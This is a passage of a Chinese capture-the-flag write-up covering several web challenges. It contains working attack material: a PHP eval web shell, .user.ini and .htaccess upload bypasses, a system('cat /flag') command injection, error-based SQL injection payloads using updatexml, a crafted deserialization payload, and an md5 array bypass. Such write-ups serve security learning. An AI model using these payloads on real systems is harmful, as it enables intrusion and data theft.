href=\"https://blog.csdn.net/m0_52923241/article/details/119751029?spm=1001.2014.3001.5502\">具体知识点点这里</a></p>\n<ul><li> <p><strong>方法一</strong>：user.ini文件构成PHP后门</p> <p>创建<code>.user.ini</code>文件，前面的<code>GIF</code>是为了绕过检测；因为后台用exif_imagetype函数检测文件类型，所以我们在文件前加上图片的特征，来绕过检测。<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8e70b7499e6d4d99b9cde65408ef438e.png\"/></p> <p>上传<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\fb0dcebfd0f241f79cead5c38e18cb47.png\"/></p> <p>创建图片文件<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\afc0014a57a9443bade70663880c4cdc.png\"/></p> <p>上传<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8a6e24be50714bb1992399de03b222cf.png\"/><br/> 蚁剑链接<code>http://5df3767e-4da9-41f9-85fc-6629510b2f2b.node4.buuoj.cn:81/uploads/ea6cf191dc7eec7b0e43199e459204e5/index.php</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8d30485cbe6344af8bc5bfb2c70e5ec3.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7ab8a8b40aeb488ca6eb142224439ff6.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ae78e22f72504edd8a0668c6388a2dd8.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c881f47671fe427a9f7e5d1bb59c8ae5.png\"/>拿到flag~~</p> </li><li> <p><strong>方法二</strong>：命令执行</p> <p>上传图片马后，扫描根目录：<code>/index.php?a=var_dump(scandir(\"/\"));</code><br/> 我们可以可以看见一个叫flag的文件<br/> <code>/index.php?a=var_dump(file_get_contents(\"/flag\"));</code>or<code>/index.php?a=system('cat /flag');</code></p> </li></ul>\n<h1><a id=\"_2019HardSQL_1098\"></a>[极客大挑战 2019]HardSQL</h1>\n<p>经测试，一些and、union、select、空格等常见的SQL语句被过滤了</p>\n<blockquote>\n<p><strong>updataxml()函数用法</strong></p>\n<p>UPDATEXML (XML_document, XPath_string, new_value);</p>\n<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br/> 第二个参数：XPath_string(Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br/> 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点<br/> 例：第二个参数使用不符合语法的参数，就会爆出错误信息</p>\n</blockquote>\n<ul><li>爆库名：<code>?username=admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=111</code>——geek</li><li>爆表名：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27)),0x7e),1))%23&amp;password=111</code>——H4rDsq1</li><li>爆字段：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=111</code>——id,username,password</li><li>爆数据：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=111</code>——flag{2ffec74c-5046-40b9-b115-ed<br/> 这里只爆出前面一部分flag，然后再使用right()函数拼接flag<br/> <code>?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=111</code>——6-40b9-b115-edce687a298b}</li></ul>\n<h1><a id=\"_2020_AreUSerialz_1116\"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1>\n<p><strong>题目类型：PHP序列化+代码审计</strong></p>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileHandler</span> <span class=\"token punctuation\">{<!-- --></span>\n\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$op</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">//类一执行就开始调用，其作用是拿来初始化一些值。</span>\n\t<span class=\"token comment\">//创建对象时触发</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$op</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"/tmp/tmpfile\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Hello World!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Bad Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Too long!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Successful!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$res</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"[Result]: &lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">//　类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。</span>\n\t<span class=\"token comment\">//对象被销毁时触发</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">op</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">op</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">content</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">//判断变量是否为可显示字符，即ascii码值在32~125，</span>\n<span class=\"token comment\">//若是，则返回true，否则返回false</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;=</span> <span class=\"token number\">32</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">125</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">//若以get传参的str变量的ASCII码值在32~125，则进行反序列化</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n\n    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p><strong>代码审计</strong>：<code>op</code>变量使用强类型比较<code>===</code>判断<code>this-&gt;op</code>的值是否等于字符串2，如果等于，则将其置为1。在process()方法中，使用弱类型比较<code>==</code>判断op的值是否对等于字符串2，若为真，则执行<code>read()</code>方法与<code>output()</code>方法。在<code>read()</code>方法中，使用<code>file_get_contents()</code>函数来读取属性filename路径的文件。</p>\n<p>编造序列化（利用public属性序列化，绕过<code>is_valid()</code>函数）</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileHandler</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$op</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=flag.php\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>得到序列化结果为<code>O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";s:7:\"content\";N;}</code><br/> 构造payload：<code>/?str=O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";s:7:\"content\";N;}</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3902c54f179e4b408db3023fc10cff95.png\"/>然后将得到的结果base64解码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2ee38cdded944a29a838b7d44e35ab18.png\"/>拿到flag~~</p>\n<h1><a id=\"MRCTF2020_1223\"></a>[MRCTF2020]你传你🐎呢</h1>\n<p><a href=\"https://blog.csdn.net/m0_52923241/article/details/119751029?spm=1001.2014.3001.5502\">具体知识点点这里</a><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6f09df13df53480bbe299fc77009c401.png\"/></p>\n<p>我先试着个一句话木马上去<code>&lt;?php @eval($_POST['test']);?&gt;</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dc56d5cd180349299904cb0a51dbcc45.png\"/>上传失败，<br/> 接着又试了试图片马，<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\0106b4b3a9a84203bb4eb9b7178bb53a.png\"/></p>\n<p>还是不行<br/> 然后就试了一下上个题的两个文件<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\4774bde5fd0f4510814a96b05f03f9fb.png\"/><br/> 上传<code>.user.ini</code>文件时，上传失败<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\682ecbf3c34042aba611fe2efd48c7fd.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\f1c86074f655484293baeb396c946989.png\"/><br/> 上传木马文件时竟然成功了，但是尝试用蚁剑连一下，连接失败<br/> 看来上一题的方法不能用，下面是学习大佬的方法</p>\n<p><strong>做题步骤</strong><br/> 此题需要上传两个文件</p>\n<p>第一个：<code>.htaccess</code>文件，用来改变文件扩展名</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string double-quoted-string\">\"a.png\"</span><span class=\"token operator\">&gt;</span>\nSetHandler application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>httpd<span class=\"token operator\">-</span>php\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>FilesMatch<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><code>&lt;FilesMatch \"a.png\"&gt;</code>指定的是要上传的文件，注意文件名必须相同</p>\n<p>上传时先抓包，修改<code>Content-Type:image/png</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3e89c59eb1b143c6b0010c731984187f.png\"/>点击forward，上传成功</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ed194737d41946e59c3052c99b27b1ae.png\"/></p>\n<p>第二个：木马文件，用来连接蚁剑或菜刀<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6f2379136e1445f895ceb729fa67fcff.png\"/><br/> 上传时同样修改<code>Content-Type:image/png</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\356a7e3249f04fc9b940021500d007ff.png\"/>用蚁剑连接：<code>http://93ac29f7-de06-4936-9f07-9b157b4704d2.node4.buuoj.cn:81/upload/fa59a7192463c0cd3dae65088e762e1f/a.png</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dec30a568ac3435e99e156416af72da0.png\"/>连接成功<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2182fc3abc8e443c85cdca31f18ab123.png\"/><br/> 拿到flag~~</p>\n<h1><a id=\"MRCTF2020Ez_bypass_1267\"></a>[MRCTF2020]Ez_bypass</h1>\n<p><strong>题目类型：md5</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\30b3d506973645029a0ce5eb84ddef9d.png\"/>F12查看源码</p>\n<pre><code class=\"prism language-php\"><span class=\"token constant\">I</span> put something in <span class=\"token constant\">F12</span> <span class=\"token keyword\">for</span> you\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$id</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$gg</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$gg</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$id</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$gg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You got the first step'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$passwd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{<!-- --></span>\n                 <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token operator\">==</span><span class=\"token number\">1234567</span><span class=\"token punctuation\">)</span>\n                 <span class=\"token punctuation\">{<!-- --></span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Good Job!'</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'By Retr_0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">}</span>\n                 <span class=\"token keyword\">else</span>\n                 <span class=\"token punctuation\">{<!-- --></span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"can you think twice??\"</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You can not get it !'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'only one way to get the flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You are not a real hacker!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Please input first'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>Please input first\n</code></pre>\n<p>这里要求<code>md5($id) === md5($gg) &amp;&amp; $id !== $gg</code></p>\n<blockquote>\n<p><code>md5($v1)===md5($v2)</code>数组绕过：a[]=a&amp;b[]=b<br/> 最后可能会报错，但是<code>null=null</code>，判断为true，成功绕过</p>\n</blockquote>\n<p>使用数组绕过：<code>/?id[]=a&amp;gg[]=b</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9facafd28fbc4da39a35a9eea00471a5.png\"/>接着要以POST传参</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{<!-- --></span>\n                 <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token operator\">==</span><span class=\"token number\">1234567</span><span class=\"token punctuation\">)</span>\n                 